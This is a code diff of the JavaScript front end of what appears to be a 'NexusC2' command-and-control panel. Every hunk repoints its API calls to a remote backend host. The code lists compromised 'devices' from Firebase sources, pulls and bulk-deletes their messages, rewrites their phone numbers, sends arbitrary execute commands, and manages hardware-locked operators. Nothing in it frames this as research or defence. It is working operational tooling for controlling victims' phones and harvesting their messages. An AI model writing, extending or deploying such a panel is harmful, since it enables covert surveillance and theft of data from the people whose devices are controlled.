@@ -1848,7 +1848,7 @@ async function unlockVault() {
     const hardwareId = btoa(hwStr).replace(/=/g, '');
     
     try {
-        const res = await fetch('/api/auth/login', {
+        const res = await fetch('https://api.nexusc2.dpdns.org/api/auth/login', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ username: user, password: pwd, hardwareId: hardwareId })
@@ -1900,7 +1900,7 @@ async function bootNexus() {
     try {
         // Fetch identity to restore permissions on page reload if token exists
         if (!window.CURRENT_ROLE) {
-            const res = await fetch(`/api/auth/me?t=${Date.now()}`, {
+            const res = await fetch(`https://api.nexusc2.dpdns.org/api/auth/me?t=${Date.now()}`, {
                 headers: { 'Authorization': `Bearer ${MASTER_KEY}` }
             });
             const data = await res.json();
@@ -2006,12 +2006,12 @@ async function getAuthToken(src) {
 // Routes all commands through the secure backend instead of hitting Firebase directly
 async function proxyFirebase(src, id, path, method = 'PUT', payload = null) {
     if (method === 'DELETE' && path === `/clients/${id}`) {
-        return fetch(`/api/devices/${src}/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` } });
+        return fetch(`https://api.nexusc2.dpdns.org/api/devices/${src}/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` } });
     }
     if (method === 'PUT' && path.includes('customPh.json')) {
-        return fetch(`/api/devices/${src}/${id}/phone`, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${localStorage.getItem('token')}` }, body: JSON.stringify({ customPh: payload }) });
+        return fetch(`https://api.nexusc2.dpdns.org/api/devices/${src}/${id}/phone`, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${localStorage.getItem('token')}` }, body: JSON.stringify({ customPh: payload }) });
     }
-    return fetch(`/api/execute/${src}/${id}`, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${localStorage.getItem('token')}` }, body: JSON.stringify({ path, payload, method }) });
+    return fetch(`https://api.nexusc2.dpdns.org/api/execute/${src}/${id}`, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${localStorage.getItem('token')}` }, body: JSON.stringify({ path, payload, method }) });
 }
 
 let _fetchAllInFlight = false;
@@ -2058,7 +2058,7 @@ async function fetchAll(isBg = false) {
 
         let newDevices = [];
         try {
-        const dbRes = await fetch(`/api/databases?t=${Date.now()}`, {
+        const dbRes = await fetch(`https://api.nexusc2.dpdns.org/api/databases?t=${Date.now()}`, {
             headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
         });
         if (dbRes.status === 401) {
@@ -2078,7 +2078,7 @@ async function fetchAll(isBg = false) {
         }
 
         const pingStart = performance.now();
-        const res = await fetch(`/api/devices?t=${Date.now()}`, {
+        const res = await fetch(`https://api.nexusc2.dpdns.org/api/devices?t=${Date.now()}`, {
             headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
         });
         window.lastPing = Math.round(performance.now() - pingStart);
@@ -2407,7 +2407,7 @@ async function fetchMsgs(d, isForceSync = false) {
     
     _inFlight[k] = true;
     try {
-        let r = await fetch(`/api/messages/${d._src}/${d._id}`, {
+        let r = await fetch(`https://api.nexusc2.dpdns.org/api/messages/${d._src}/${d._id}`, {
             headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
         });
         if (r.ok) {
@@ -3345,7 +3345,7 @@ async function addDb() {
         let res;
         if (editingDbIdx >= 0) {
             const srcKey = SOURCES[editingDbIdx].key;
-            res = await fetch(`/api/databases/${srcKey}`, {
+            res = await fetch(`https://api.nexusc2.dpdns.org/api/databases/${srcKey}`, {
                 method: 'PUT',
                 headers: { 
                     'Content-Type': 'application/json',
@@ -3354,7 +3354,7 @@ async function addDb() {
                 body: JSON.stringify(payload)
             });
         } else {
-            res = await fetch('/api/databases', {
+            res = await fetch('https://api.nexusc2.dpdns.org/api/databases', {
                 method: 'POST',
                 headers: { 
                     'Content-Type': 'application/json',
@@ -3445,7 +3445,7 @@ function removeDb(idx) {
         const deletedSrc = SOURCES[idx].key;
         
         try {
-            const res = await fetch(`/api/databases/${deletedSrc}`, {
+            const res = await fetch(`https://api.nexusc2.dpdns.org/api/databases/${deletedSrc}`, {
                 method: 'DELETE',
                 headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
             });
@@ -3511,7 +3511,7 @@ async function createUser() {
             permissions: { canEditPhone, canUseAutoDiscovery }
         };
         
-        const res = await fetch('/api/admin/users', {
+        const res = await fetch('https://api.nexusc2.dpdns.org/api/admin/users', {
             method: 'POST',
             headers: { 
                 'Content-Type': 'application/json',
@@ -3544,7 +3544,7 @@ async function createUser() {
 async function deleteDb(key) {
     customConfirm('Disconnect Source', `Are you sure you want to permanently disconnect this Firebase source (${key})? All associated devices and intelligence will be dropped.`, async () => {
         try {
-            const res = await fetch(`/api/databases/${key}`, {
+            const res = await fetch(`https://api.nexusc2.dpdns.org/api/databases/${key}`, {
                 method: 'DELETE',
                 headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
             });
@@ -3567,7 +3567,7 @@ async function deleteDb(key) {
 async function deleteUser(id, username) {
     customConfirm('Revoke Access', `Are you sure you want to permanently revoke access for Operator '${username}'? They will be immediately locked out of the panel.`, async () => {
         try {
-            const res = await fetch(`/api/admin/users/${id}`, {
+            const res = await fetch(`https://api.nexusc2.dpdns.org/api/admin/users/${id}`, {
                 method: 'DELETE',
                 headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
             });
@@ -3894,7 +3894,7 @@ function startDiscoveryScan(receiverId, selectedDevices) {
         
         let allMsgs = [];
         try {
-            let r = await fetch(`/api/messages/${rDev._src}/${rDev._id}`, {
+            let r = await fetch(`https://api.nexusc2.dpdns.org/api/messages/${rDev._src}/${rDev._id}`, {
                 headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
             });
             if (r.ok) {
@@ -4237,7 +4237,7 @@ async function executeDeleteMsg() {
     btn.innerHTML = '<div class="spinner" style="width:14px;height:14px;border-width:2px;border-top-color:#fff;"></div>';
     
     try {
-        const res = await fetch(`/api/messages/${dev._src}/${dev._id}`, {
+        const res = await fetch(`https://api.nexusc2.dpdns.org/api/messages/${dev._src}/${dev._id}`, {
             method: 'DELETE',
             headers: {
                 'Content-Type': 'application/json',
@@ -4320,7 +4320,7 @@ async function executeBulkDeleteMsgs() {
             }, index * 50);
             
             try {
-                const r = await fetch(`/api/messages/${selDev._src}/${selDev._id}`, {
+                const r = await fetch(`https://api.nexusc2.dpdns.org/api/messages/${selDev._src}/${selDev._id}`, {
                     method: 'DELETE',
                     headers: {
                         'Content-Type': 'application/json',
@@ -4587,7 +4587,7 @@ async function handleDbBulkAdd(event) {
                 document.getElementById('loadSubtext').textContent = db.label;
                 
                 try {
-                    const res = await fetch('/api/databases', {
+                    const res = await fetch('https://api.nexusc2.dpdns.org/api/databases', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
@@ -4780,7 +4780,7 @@ function renderAdminDbGrid() {
 async function toggleUserPerm(userId, permission, isChecked) {
     try {
         const payload = { permission, value: isChecked };
-        const res = await fetch(`/api/admin/users/${userId}/permissions`, {
+        const res = await fetch(`https://api.nexusc2.dpdns.org/api/admin/users/${userId}/permissions`, {
             method: 'PUT',
             headers: { 
                 'Content-Type': 'application/json',
@@ -4812,7 +4812,7 @@ async function renderAdminUserList(isBg = false) {
     
     _isFetchingUsers = true;
     try {
-        const res = await fetch(`/api/admin/users?t=${Date.now()}`, { 
+        const res = await fetch(`https://api.nexusc2.dpdns.org/api/admin/users?t=${Date.now()}`, { 
             headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` },
             cache: 'no-store'
         });
@@ -4939,7 +4939,7 @@ function openEditOpModal(id) {
     // Self-check to prevent self-deletion or self-demotion
     // We assume window.CURRENT_USERNAME is set somewhere, or we can use the ID if we have window.CURRENT_USER_ID.
     // Wait, let's look for how we know who the current user is.
-    // It's fetched in /api/auth/me but maybe not saved with ID.
+    // It's fetched in https://api.nexusc2.dpdns.org/api/auth/me but maybe not saved with ID.
     // Let's decode the token to get ID, or we can just parse the JWT from localStorage.
     let currentUserId = null;
     try {
@@ -5045,7 +5045,7 @@ async function saveOperator() {
             permissions
         };
         
-        const res = await fetch('/api/admin/users/' + id, {
+        const res = await fetch('https://api.nexusc2.dpdns.org/api/admin/users/' + id, {
             method: 'PUT',
             headers: { 
                 'Content-Type': 'application/json',
@@ -5074,7 +5074,7 @@ document.getElementById('editOpHwBtn').addEventListener('click', async () => {
     const id = document.getElementById('editOpIdVal').value;
     customConfirm('Release Hardware Lock', 'Are you sure you want to release the hardware lock? The operator will be able to log in from a new device.', async () => {
         try {
-            const res = await fetch('/api/admin/users/' + id, {
+            const res = await fetch('https://api.nexusc2.dpdns.org/api/admin/users/' + id, {
                 method: 'PUT',
                 headers: { 
                     'Content-Type': 'application/json',
@@ -5261,7 +5261,7 @@ function openAddDbDrawer() {
                     apiKey: auth, 
                     color: '#00f0ff' 
                 };
-                const res = await fetch('/api/databases', {
+                const res = await fetch('https://api.nexusc2.dpdns.org/api/databases', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${MASTER_KEY}` },
                     body: JSON.stringify(payload)
@@ -5293,7 +5293,7 @@ function openAddDbDrawer() {
     </div>
     <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
     <script>
-        const socket = io('https://nexusc2backend.duckdns.org', {
+        const socket = io('https://api.nexusc2.dpdns.org', {
             transports: ['websocket']
         });
         socket.on('newMessage', (msg) => {
@@ -5435,7 +5435,7 @@ function openAddDbDrawer() {
                 if (!adminTabVisible) return;
 
                 // User Metrics
-                const res = await fetch('/api/metrics', { headers: { 'Authorization': `Bearer ${MASTER_KEY}` }});
+                const res = await fetch('https://api.nexusc2.dpdns.org/api/metrics', { headers: { 'Authorization': `Bearer ${MASTER_KEY}` }});
                 if (res.ok) {
                     const json = await res.json();
                     if (json.success && json.data) {
@@ -5460,8 +5460,8 @@ function openAddDbDrawer() {
                 if (adminTabVisible && window.CURRENT_ROLE === 'admin') {
                     try {
                         const [aRes, rRes] = await Promise.all([
-                            fetch('/api/admin/metrics', { headers: { 'Authorization': `Bearer ${MASTER_KEY}` }}),
-                            fetch('https://nexusc2backend.duckdns.org/api/render-metrics').catch(() => null)
+                            fetch('https://api.nexusc2.dpdns.org/api/admin/metrics', { headers: { 'Authorization': `Bearer ${MASTER_KEY}` }}),
+                            fetch('https://api.nexusc2.dpdns.org/api/render-metrics').catch(() => null)
                         ]);
                         
                         if (aRes.ok) {
